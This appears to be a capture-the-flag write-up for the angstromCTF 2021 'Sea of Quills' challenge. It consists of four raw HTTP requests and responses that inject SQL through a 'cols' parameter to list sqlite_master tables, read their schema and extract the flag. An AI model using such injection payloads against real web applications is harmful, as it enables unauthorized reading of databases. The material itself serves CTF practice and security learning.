Req 1
```
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 62

limit=100&offset=0&cols=111,222,333 union select url,desc,name

```

Resp 1
```
	<img src="111" class="w3 h3">
<li class="pb5 pl3">222 <ul><li>333</li></ul></li><br />
```

Req 2
```
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 86

limit=100&offset=0&cols=111,222,tbl_name FROM sqlite_master union select url,desc,name
```

Resp 2
```
------------------------------------------------------------------------------------------------------------------
	<img src="111" class="w3 h3">
<li class="pb5 pl3">222 <ul><li>flagtable</li></ul></li><br />

	<img src="111" class="w3 h3">
<li class="pb5 pl3">222 <ul><li>quills</li></ul></li><br />
```

Req 3
```
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 81

limit=100&offset=0&cols=111,222,sql FROM sqlite_master union select url,desc,name
```

Resp 3
```
	<img src="111" class="w3 h3">
<li class="pb5 pl3">222 <ul><li>CREATE TABLE flagtable (
flag varchar(30)
)</li></ul></li><br />

	<img src="111" class="w3 h3">
<li class="pb5 pl3">222 <ul><li>CREATE TABLE quills (
	url varchar(30),
	name varchar(30),
	desc varchar(30)
)</li></ul></li><br />
```

Req 4
```
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 78

limit=100&offset=0&cols=111,222,flag FROM flagtable union select url,desc,name
```

Resp 4
```
	<img src="111" class="w3 h3">
<li class="pb5 pl3">222 <ul><li>actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}</li></ul></li><br />
```